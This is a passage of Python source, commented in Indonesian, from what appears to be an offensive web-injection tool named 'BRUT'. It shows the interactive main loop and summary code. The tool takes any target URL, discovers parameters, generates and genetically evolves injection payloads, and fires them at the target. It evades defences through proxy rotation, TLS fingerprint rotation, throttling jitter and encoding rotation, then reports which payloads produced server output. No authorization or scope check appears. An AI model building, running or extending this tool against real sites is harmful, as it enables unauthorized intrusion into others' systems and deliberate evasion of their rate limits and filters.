        """Menyimpan seluruh hasil pipeline dan metadata analisis ke disk."""
        return self.saver.save(self.results, self.payloads,
                              self.learner, self.schema, self.evolver,
                              self.proxy_manager, self.throttler,
                              confirmer=confirmer or self.confirmer)

    def print_summary(self):
        """Menampilkan ringkasan hasil, pembelajaran, proxy, dan throttling."""
        server = [r for r in self.results if r.response_type == "server_output"]
        raw = [r for r in self.results if r.response_type == "raw_html"]
        blocked = [r for r in self.results if r.response_type == "blocked"]
        rate_limited = [r for r in self.results if r.status_code == 429]

        print(f"\n\033[1;36m{'='*80}")
        print(f"  BRUT v6.0.1 — ANTI-RATE-LIMIT GENETIC ML SUMMARY")
        print(f"{'='*80}\033[0m")
        print(f"  Total tested         : {len(self.results)}")
        print(f"  \033[32m✓ Server output\033[0m      : {len(server)}")
        print(f"  \033[37m~ Raw HTML\033[0m           : {len(raw)}")
        print(f"  \033[31m✗ Blocked\033[0m            : {len(blocked)}")
        print(f"  \033[33m⏳ Rate Limited (429)\033[0m  : {len(rate_limited)}")

        print(f"\n  \033[1;35mML Learning:\033[0m {self.learner.get_learning_summary()}")
        print(f"  \033[1;35mGenetic:\033[0m {self.evolver.get_generation_summary()}")
        print(f"  \033[1;35mEncoding:\033[0m {self.encoder.get_rotation_summary()}")

        print(f"\n  \033[1;35m{'─'*40} ANTI-RATE-LIMIT {'─'*40}\033[0m")
        self.proxy_manager.print_pool_status()
        self.throttler.print_stats()
        print(f"  \033[1;36m[TLS]\033[0m Current fingerprint: {self.tls_engine.get_current_fingerprint()}")
        retry_stats = self.retry_engine.get_retry_stats()
        print(f"  \033[1;36m[RETRY]\033[0m Total retries: {retry_stats['total_retries']}")

        self.schema.print_evolution_summary()

        if self.learner.blocked_mutations:
            print(f"\n  \033[1;31mNegative Selection (Blacklisted Mutations):\033[0m")
            print(f"    {list(self.learner.blocked_mutations)}")

        if self.learner.successful_patterns:
            print(f"\n  \033[1;32mSuccessful Patterns:\033[0m")
            for sp in self.learner.successful_patterns[:5]:
                muts = sp.get("mutations", [])
                print(f"    • [{sp['category']}] {sp['strategy']} | muts={muts[:3]} | {sp['evidence'][:50]}")

        if server:
            print(f"\n  \033[1;32mTop Successful Payloads:\033[0m")
            for r in server[:5]:
                print(f"    ✓ [{r.payload_id}] {r.category} | ctx={r.injection_context} | "
                      f"proxy={r.proxy_used[:20]} | tls={r.tls_fingerprint[:12]} | "
                      f"{r.evidence[:40]}")


# ============================================================
# INTERACTIVE MAIN LOOP v6.0.1
# ============================================================
def interactive_main():
    """Menjalankan lobby interaktif untuk memilih target dan mengendalikan pipeline."""
    # v7.0 NEW: Inisialisasi database (auto-create jika belum ada)
    global DB
    DB = init_database()

    # Pesan tertunda yang akan ditampilkan di lobby berikutnya
    lobby_message = ""

    while True:
        # Bersihkan layar & cetak ulang banner setiap iterasi
        # → menghapus bekas box/input lama saat perintah salah
        clear_screen()
        print_banner()

        # Tampilkan pesan tertunda (error/status) jika ada
        if lobby_message:
            print(f"  {lobby_message}")
            lobby_message = ""

        db_count = DB.count()
        # Baris placeholder untuk animasi welcome (di atas box)
        print()
        print(" ")
        print(f"\033[1;33m{'─'*60}\033[0m")
        print(f"  \033[1;37mTarget Input\033[0m  (link / domain / URL / IP)")
        print(f"  \033[32m[DB]\033[0m Database: \033[1;37m{DB_FILE}\033[0m ({db_count} target tersimpan)")
        print(f"  Ketik \033[31m/exit\033[0m untuk keluar")
        print(f"  Ketik \033[35m/proxy <file>\033[0m untuk load proxy list")
        print(f"\033[1;33m{'─'*60}\033[0m")

        # Start animasi welcome (berjalan di baris khususnya sendiri)
        WELCOME_ANIM_STOP.clear()
        anim_thread = threading.Thread(target=animate_welcome, daemon=True)
        anim_thread.start()

        proxy_file = None

        try:
            target = input(f"\n  \033[1;36mBRUT\033[0m \033[33m>>\033[0m ").strip()
        except (EOFError, KeyboardInterrupt):
            stop_welcome_animation(anim_thread)
            print(f"\n\n\033[31m[*]\033[0m Exiting...")
            break

        # Hentikan animasi welcome begitu user menekan Enter
        stop_welcome_animation(anim_thread)

        if not target: continue
        if target.lower() in ["/exit", "exit", "/quit", "quit"]:
            print(f"\n\033[31m[*]\033[0m Goodbye!"); break

        # v7.0: Perintah tak dikenal (diawali / tapi bukan perintah valid)
        _valid_prefixes = ("/proxy ", "/save ", "/viewdb", "/load ", "/back", "/cancel")
        if target.startswith("/") and not any(target.lower().startswith(p) for p in _valid_prefixes):
            lobby_message = f"\033[1;31m[!] Perintah tidak dikenal: {target}\033[0m"
            continue

        # === /save <target> — simpan target ke database ===
        if target.lower().startswith("/save "):
            save_url = target[6:].strip()
            if not save_url:
                lobby_message = "\033[1;31m[!] Usage: /save <link/ip/domain/url>\033[0m"
                continue
            # Normalisasi
            if not save_url.startswith(("http://", "https://")):
                save_url = "http://" + save_url
            parsed_save = urlparse(save_url)
            if not parsed_save.netloc:
                lobby_message = f"\033[1;31m[!] Target tidak valid untuk disimpan: {save_url}\033[0m"
                continue
            new_id = DB.save_target(save_url)
            lobby_message = f"\033[1;32m[✓] Target tersimpan dengan ID {new_id}: {save_url}\033[0m"
            continue

        # === /viewdb — tampilkan isi database ===
        if target.lower() == "/viewdb":
            stop_welcome_animation(anim_thread)
            targets = DB.get_all_targets()
            print(f"\n\033[1;33m{'═'*60}\033[0m")
            print(f"  \033[1;36m📦 DATABASE TARGET\033[0m  ({len(targets)} entri)")
            print(f"\033[1;33m{'─'*60}\033[0m")
            if not targets:
                print(f"  \033[90m(Database kosong — gunakan /save <url> untuk menyimpan)\033[0m")
            else:
                print(f"  \033[1;37m{'ID':<5}{'TARGET':<45}{'TANGGAL'}\033[0m")
                print(f"  \033[90m{'─'*56}\033[0m")
                for t in targets:
                    tid = t['id']
                    turl = t['target'][:42] + "..." if len(t['target']) > 42 else t['target']
                    tdate = t['created_at'][:10] if t['created_at'] else "-"
                    print(f"  \033[1;33m{tid:<5}\033[0m{turl:<45}\033[90m{tdate}\033[0m")
            print(f"\033[1;33m{'─'*60}\033[0m")
            print(f"  \033[90mKetik \033[1;37m/load <id>\033[0m \033[90muntuk memuat target, atau \033[1;37m/back\033[0m \033[90muntuk kembali\033[0m")
            print(f"\033[1;33m{'═'*60}\033[0m")
            # Tunggu user menekan Enter atau /back
            while True:
                try:
                    sub_cmd = input(f"\n  \033[1;36mDB\033[0m \033[33m>>\033[0m ").strip()
                except (EOFError, KeyboardInterrupt):
                    break
                if sub_cmd.lower() in ("/back", "back", ""):
                    break
                if sub_cmd.lower().startswith("/load "):
                    try:
                        load_id = int(sub_cmd.split()[1])
                    except (IndexError, ValueError):
                        print(f"  \033[31m[!] ID harus angka. Contoh: /load 1\033[0m")
                        continue
                    loaded_target = DB.get_target_by_id(load_id)
                    if loaded_target is None:
                        print(f"  \033[31m[!] ID {load_id} tidak ditemukan di database.\033[0m")
                        continue
                    print(f"\n  \033[1;32m[✓] Target dimuat: {loaded_target}\033[0m")
                    target = loaded_target
                    break
                else:
                    print(f"  \033[90mPerintah tidak dikenal. Ketik /back untuk kembali.\033[0m")
            if target.lower().startswith("/load "):
                # target sudah di-set di dalam sub-loop
                pass
            elif target == "/viewdb":
                continue
        # === /load <id> — muat target dari database langsung dari lobby ===
        if target.lower().startswith("/load "):
            try:
                load_id = int(target.split()[1])
            except (IndexError, ValueError):
                lobby_message = "\033[1;31m[!] ID harus angka. Contoh: /load 1\033[0m"
                continue
            loaded_target = DB.get_target_by_id(load_id)
            if loaded_target is None:
                lobby_message = f"\033[1;31m[!] ID {load_id} tidak ditemukan di database.\033[0m"
                continue
            lobby_message = f"\033[1;32m[✓] Target dimuat dari DB (ID {load_id}): {loaded_target}\033[0m"
            target = loaded_target
            LOADED_TARGET_ID = load_id
            # Jangan continue — biarkan jatuh ke proses pipeline di bawah

        # === /back — konfirmasi keluar dari lobby ===
        if target.lower() == "/back":
            # Saat progress blocking, /back tidak bisa diketik (main thread sibuk)
            # Di lobby normal: konfirmasi keluar
            try:
                confirm_back = input(f"  \033[1;33m[?] Kembali ke awal (keluar)? [y/N] >> \033[0m").strip().lower()
            except (EOFError, KeyboardInterrupt):
                continue
            if confirm_back in ("y", "yes", "ya"):
                print(f"\n\033[31m[*]\033[0m Goodbye!")
                break
            else:
                lobby_message = "\033[1;36m[←] Tetap di lobby.\033[0m"
                continue
                

        # === /cancel — batalkan target yang di-load (sebelum progress) ===
        if target.lower() == "/cancel":
            # Saat progress blocking, /cancel tidak bisa diketik (main thread sibuk)
            # Jadi handler ini hanya untuk membatalkan loaded target di lobby
            if LOADED_TARGET_ID is None:
                lobby_message = "\033[1;33m[!] Tidak ada yang perlu dibatalkan.\033[0m"
                continue
            # Konfirmasi y/n
            try:
                confirm_cancel = input(f"  \033[1;31m[⚠] Apakah anda yakin? [y/N] >> \033[0m").strip().lower()
            except (EOFError, KeyboardInterrupt):
                continue
            if confirm_cancel in ("y", "yes", "ya"):
                if PROGRESS_ACTIVE:
                    CANCEL_EVENT.set()
                    lobby_message = "\033[1;31m[✗] Proses dibatalkan. Kembali ke lobby.\033[0m"
                elif LOADED_TARGET_ID is not None:
                    LOADED_TARGET_ID = None
                    lobby_message = "\033[1;31m[✗] Target yang di-load dibatalkan. Kembali ke lobby.\033[0m"
                continue
            else:
                lobby_message = "\033[1;36m[←] Pembatalan dibatalkan. Melanjutkan...\033[0m"
                continue

        if target.lower().startswith("/proxy "):
            proxy_file = target[7:].strip()
            print(f"  \033[35m[*]\033[0m Proxy file set: {proxy_file}")
            try:
                target = input(f"\n  \033[1;36mBRUT\033[0m \033[33m>> (now enter target URL)\033[0m ").strip()
            except (EOFError, KeyboardInterrupt):
                break
            if not target or target.lower() in ["/exit", "exit"]:
                continue

        if not target.startswith(("http://", "https://")):
            target = "http://" + target

        parsed = urlparse(target)
        if not parsed.netloc:
            lobby_message = f"\033[1;31m[!] Target tidak valid: {target}\033[0m"
            continue

        # v7.0 (Batch 4): Pipeline blocking — input bar hilang saat progress
        # Ctrl+C membatalkan proses dan kembali ke lobby (bukan keluar script)
        CANCEL_EVENT.clear()
        PROGRESS_ACTIVE = True
        try:
            pipeline = BRUTPipeline(target, proxy_file=proxy_file)
            params = pipeline.phase1_discover()

            if not params:
                PROGRESS_ACTIVE = False
                lobby_message = f"\n  \033[31m[!]\033[0m Tidak ada parameter ditemukan"
                continue

            print(f"\n\033[1;32m{'='*60}")
            print(f"  DEEP PARAMETER DISCOVERY RESULTS")
            print(f"{'='*60}\033[0m")
            print(f"  Total: \033[1;37m{len(params)}\033[0m\n")

            by_loc = defaultdict(list)
            for p in params: by_loc[p.location].append(p)
            for loc, plist in by_loc.items():
                print(f"  \033[36m[{loc.upper()}]\033[0m ({len(plist)})")
                for p in plist[:8]:
                    extra = ""
                    if p.context.get("reason"):
                        extra = f" \033[90m({p.context['reason'][:30]})\033[0m"
                    elif p.context.get("source"):
                        extra = f" \033[90m({p.context['source']})\033[0m"
                    print(f"    • \033[37m{p.name:<25}\033[0m [{p.method}] {p.url[:50]}{extra}")
                if len(plist) > 8:
                    print(f"    ... dan {len(plist)-8} lainnya")
                print()

            print(f"  \033[1;35mAnti-Rate-Limit Status:\033[0m")
            pipeline.proxy_manager.print_pool_status()
            print(f"  \033[1;36m[TLS]\033[0m Fingerprint: {pipeline.tls_engine.get_current_fingerprint()}")
            print(f"  \033[1;36m[THROTTLE]\033[0m Jitter: {pipeline.throttler.min_delay}-{pipeline.throttler.max_delay}s | "
                  f"Backoff: exponential auto")
            print()

            try:
                confirm = input(f"  \033[1;33mLanjut injection? [Y/N] >> \033[0m").strip().lower()
            except (EOFError, KeyboardInterrupt):
                PROGRESS_ACTIVE = False
                lobby_message = "\033[1;31m[✗] Proses dibatalkan.\033[0m"
                continue
            if confirm not in ["y", "yes", "ya", ""]:
                print(f"  \033[33m[*]\033[0m Dibatalkan.")
                PROGRESS_ACTIVE = False
                continue

            print(f"\n\033[1;33m{'─'*60}\033[0m")
            print(f"  \033[1;37mJumlah Payload Variant\033[0m (angka / max)")
            print(f"  \033[90mGenetic evolution setiap 100 test | TLS rotate setiap 100 test\033[0m")
            print(f"  \033[90mAdaptive throttle aktif | Proxy rotation otomatis\033[0m")
            print(f"\033[1;33m{'─'*60}\033[0m")

            try:
                count_input = input(f"\n  \033[1;36mBRUT\033[0m \033[33m>> \033[0m").strip().lower()
            except (EOFError, KeyboardInterrupt):
                PROGRESS_ACTIVE = False
                lobby_message = "\033[1;31m[✗] Proses dibatalkan.\033[0m"
                continue

            max_mode = False
            if count_input == "max":
                max_mode = True; payload_count = 500
                print(f"  \033[35m[*]\033[0m MAX mode aktif")
            else:
                try:
                    payload_count = int(count_input)
                    if payload_count <= 0: raise ValueError
                except ValueError:
                    PROGRESS_ACTIVE = False
                    lobby_message = f"  \033[31m[!]\033[0m Input tidak valid"
                    continue

            print(f"\n\033[36m[*]\033[0m Generating {payload_count} payloads (grammar-validated)...")
            payloads = pipeline.phase2_generate(payload_count)
            print(f"  \033[32m[+]\033[0m Generated {len(payloads)} unique payloads")
            by_cat = Counter(p["category"] for p in payloads)
            print(f"  Categories: {dict(by_cat)}")
            print(f"  \033[1;35mGenetic population initialized: {len(payloads)}\033[0m")

            pipeline.phase3_inject(max_mode=max_mode)

            success_count = len([r for r in pipeline.results if r.response_type == "server_output"])
            if success_count == 0 and not max_mode:
                pipeline.phase3_advanced_retry()

            txt_path, json_path = pipeline.phase4_save(confirmer=pipeline.confirmer)
            pipeline.print_summary()
            print(f"\n  \033[32m[+]\033[0m Report: {txt_path}")
            print(f"          {json_path}")

            pipeline.injector.close()
            PROGRESS_ACTIVE = False
            LOADED_TARGET_ID = None

        except KeyboardInterrupt:
            # Ctrl+C saat progress → batalkan dan kembali ke lobby (BUKAN keluar script)
            CANCEL_EVENT.set()
            PROGRESS_ACTIVE = False
            LOADED_TARGET_ID = None
            print(f"\n\n  \033[1;31m[✗]\033[0m Proses dibatalkan oleh user (Ctrl+C)")
            try:
                pipeline.injector.close()
            except Exception:
                pass
            lobby_message = "\033[1;31m[✗] Proses dibatalkan (Ctrl+C). Kembali ke lobby.\033[0m"
            continue

if __name__ == "__main__":
    try:
        interactive_main()
    except KeyboardInterrupt:
        print(f"\n\n\033[31m[*]\033[0m Interrupted.")
        sys.exit(0)
    except Exception as e:
        print(f"\n\033[31m[FATAL]\033[0m {e}")
        traceback.print_exc()
        sys.exit(1)
